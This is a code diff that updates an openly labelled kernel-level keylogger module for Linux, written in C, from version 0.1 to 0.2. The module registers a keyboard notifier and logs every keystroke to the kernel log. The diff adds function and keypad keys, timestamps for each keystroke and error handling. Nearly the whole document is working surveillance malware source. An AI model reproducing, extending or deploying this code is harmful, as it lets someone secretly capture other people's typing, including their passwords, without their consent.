@@ -1,79 +1,115 @@
 #include <linux/module.h>
 #include <linux/kernel.h>
 #include <linux/keyboard.h>
-#define LICENSE "GPL";
-#define AUTHOR "1day";
-#define DESCRIPTION "A simple kernel-level keylogger for Linux operating systems.";
-#define VERSION "0.1";
+#include <linux/init.h>
+#include <linux/timekeeping.h>
 
-static const char *keymap[128] = {
-    [1] = "ESC",
-    [2] = "1",
-    [3] = "2",
-    [4] = "3",
-    [5] = "4",
-    [6] = "5",
-    [7] = "6",
-    [8] = "7",
-    [9] = "8",
-    [10] = "9",
-    [11] = "0",
-    [12] = "MINUS",
-    [13] = "EQUAL",
-    [14] = "Backspace",
-    [15] = "Tab",
-    [16] = "Q",
-    [17] = "W",
-    [18] = "E",
-    [19] = "R",
-    [20] = "T",
-    [21] = "Y",
-    [22] = "U",
-    [23] = "I",
-    [24] = "O",
-    [25] = "P",
-    [26] = "LEFTBRACE",
-    [27] = "RIGHTBRACE",
-    [28] = "ENTER",
-    [29] = "LEFTCTRL",
-    [30] = "A",
-    [31] = "S",
-    [32] = "D",
-    [33] = "F",
-    [34] = "G",
-    [35] = "H",
-    [36] = "J",
-    [37] = "K",
-    [38] = "L",
-    [39] = "SEMICOLON",
-    [40] = "APOSTROPHE",
-    [41] = "GRAVE",
-    [42] = "LEFTSHIFT",
-    [43] = "BACKSLASH",
-    [44] = "Z",
-    [45] = "X",
-    [46] = "C",
-    [47] = "V",
-    [48] = "B",
-    [49] = "N",
-    [50] = "M",
-    [51] = "COMMA",
-    [52] = "DOT",
-    [53] = "SLASH",
-    [54] = "RIGHTSHIFT",
-    [56] = "LEFTALT",
-    [57] = "SPACE",
-    [58] = "CAPSLOCK"  // Will be adding more keys in the future
+#define LICENSE "GPL"
+#define AUTHOR "1day & isPique"
+#define DESCRIPTION "A simple kernel-level keylogger for Linux operating systems"
+#define VERSION "0.2"
+
+static const char *keymap[KEY_CNT] = {
+    [KEY_ESC] = "ESC",
+    [KEY_1] = "1",
+    [KEY_2] = "2",
+    [KEY_3] = "3",
+    [KEY_4] = "4",
+    [KEY_5] = "5",
+    [KEY_6] = "6",
+    [KEY_7] = "7",
+    [KEY_8] = "8",
+    [KEY_9] = "9",
+    [KEY_0] = "0",
+    [KEY_MINUS] = "MINUS",
+    [KEY_EQUAL] = "EQUAL",
+    [KEY_BACKSPACE] = "Backspace",
+    [KEY_TAB] = "Tab",
+    [KEY_Q] = "Q",
+    [KEY_W] = "W",
+    [KEY_E] = "E",
+    [KEY_R] = "R",
+    [KEY_T] = "T",
+    [KEY_Y] = "Y",
+    [KEY_U] = "U",
+    [KEY_I] = "I",
+    [KEY_O] = "O",
+    [KEY_P] = "P",
+    [KEY_LEFTBRACE] = "LEFTBRACE",
+    [KEY_RIGHTBRACE] = "RIGHTBRACE",
+    [KEY_ENTER] = "ENTER",
+    [KEY_LEFTCTRL] = "LEFTCTRL",
+    [KEY_A] = "A",
+    [KEY_S] = "S",
+    [KEY_D] = "D",
+    [KEY_F] = "F",
+    [KEY_G] = "G",
+    [KEY_H] = "H",
+    [KEY_J] = "J",
+    [KEY_K] = "K",
+    [KEY_L] = "L",
+    [KEY_SEMICOLON] = "SEMICOLON",
+    [KEY_APOSTROPHE] = "APOSTROPHE",
+    [KEY_GRAVE] = "GRAVE",
+    [KEY_LEFTSHIFT] = "LEFTSHIFT",
+    [KEY_BACKSLASH] = "BACKSLASH",
+    [KEY_Z] = "Z",
+    [KEY_X] = "X",
+    [KEY_C] = "C",
+    [KEY_V] = "V",
+    [KEY_B] = "B",
+    [KEY_N] = "N",
+    [KEY_M] = "M",
+    [KEY_COMMA] = "COMMA",
+    [KEY_DOT] = "DOT",
+    [KEY_SLASH] = "SLASH",
+    [KEY_RIGHTSHIFT] = "RIGHTSHIFT",
+    [KEY_LEFTALT] = "LEFTALT",
+    [KEY_SPACE] = "SPACE",
+    [KEY_CAPSLOCK] = "CAPSLOCK",
+    [KEY_F1] = "F1",
+    [KEY_F2] = "F2",
+    [KEY_F3] = "F3",
+    [KEY_F4] = "F4",
+    [KEY_F5] = "F5",
+    [KEY_F6] = "F6",
+    [KEY_F7] = "F7",
+    [KEY_F8] = "F8",
+    [KEY_F9] = "F9",
+    [KEY_F10] = "F10",
+    [KEY_NUMLOCK] = "NUMLOCK",
+    [KEY_SCROLLLOCK] = "SCROLLLOCK",
+    [KEY_KP7] = "KP7",
+    [KEY_KP8] = "KP8",
+    [KEY_KP9] = "KP9",
+    [KEY_KPMINUS] = "KPMINUS",
+    [KEY_KP4] = "KP4",
+    [KEY_KP5] = "KP5",
+    [KEY_KP6] = "KP6",
+    [KEY_KPPLUS] = "KPPLUS",
+    [KEY_KP1] = "KP1",
+    [KEY_KP2] = "KP2",
+    [KEY_KP3] = "KP3",
+    [KEY_KP0] = "KP0",
+    [KEY_KPDOT] = "KPDOT",
+    [KEY_F11] = "F11",
+    [KEY_F12] = "F12",
+    // Add more keys as needed
 };
 
 static int last_pressed_key = -1;
 
 static int keylogger_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
     struct keyboard_notifier_param *param = _param;
+    struct timespec ts;
+    char timestamp[64];
+
     if (code == KBD_KEYCODE) {
-        if (param->value < sizeof(keymap) / sizeof(keymap[0]) && keymap[param->value]) {
+        if (param->value < ARRAY_SIZE(keymap) && keymap[param->value]) {
             if (param->value != last_pressed_key) {
-                printk(KERN_INFO "Key pressed: %s\n", keymap[param->value]);
+                ktime_get_real_ts(&ts);
+                snprintf(timestamp, sizeof(timestamp), "%ld.%09ld", ts.tv_sec, ts.tv_nsec);
+                printk(KERN_INFO "[%s] Key pressed: %s\n", timestamp, keymap[param->value]);
                 last_pressed_key = param->value;
             }
         }
@@ -86,7 +122,14 @@ static struct notifier_block keylogger_nb = {
 };
 
 static int __init init_keylogger(void) {
-    register_keyboard_notifier(&keylogger_nb);
+    int result;
+
+    result = register_keyboard_notifier(&keylogger_nb);
+    if (result) {
+        printk(KERN_ERR "Failed to register keyboard notifier\n");
+        return result;
+    }
+
     printk(KERN_ALERT "Keylogger loaded into the kernel\n");
     return 0;
 }
